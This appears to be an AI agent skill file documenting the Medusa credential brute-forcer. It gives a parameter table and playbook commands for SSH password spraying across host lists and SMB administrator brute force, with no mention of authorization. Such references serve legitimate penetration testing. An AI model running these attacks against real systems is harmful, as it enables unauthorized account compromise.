---
name: medusa-bruteforce
description: "Medusa: Multi-service credential brute forcing. Signals: brute force, password spraying, SSH brute force, SMB, HTTP forms."
zh-signals: "Medusa: 多服务凭据爆破。信号:暴力破解,口令喷射,SSH 爆破,SMB,HTTP 表单。"
when-to-use: >-
  Use to brute-force credentials across many services such as SSH, SMB, and HTTP
  forms with configurable threads and parallel hosts.
---

# Medusa

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/jmk-foofus/medusa
- Upstream License: LGPL-2.1 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
apt install medusa or build from source
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `-M ssh -h 10.0.0.5 -U users.txt -P pass.txt` | SSH brute force |
| `-M smbnt` | SMB |
| `-M http -m DIR:/admin -m FORM:u=user&p=pass` | HTTP form |
| `-t 16` | Threads |
| `-T 64` | Parallel hosts |
| `-O out.txt` | Output |
| `-f` | Stop at the first hit |
| `-n 2222` | Non-standard port |

## Attack Scenario Playbook

### Multi-service credential brute force

```bash
medusa -M ssh -H ips.txt -U users.txt -P seasons.txt -t 32 -O hits.txt
medusa -M smbnt -h 10.0.0.5 -u administrator -P pass.txt -f
```

## Notes

A modular parallel brute forcer; supports 20+ protocols and its parallel host mode handles large network segments better than Hydra.
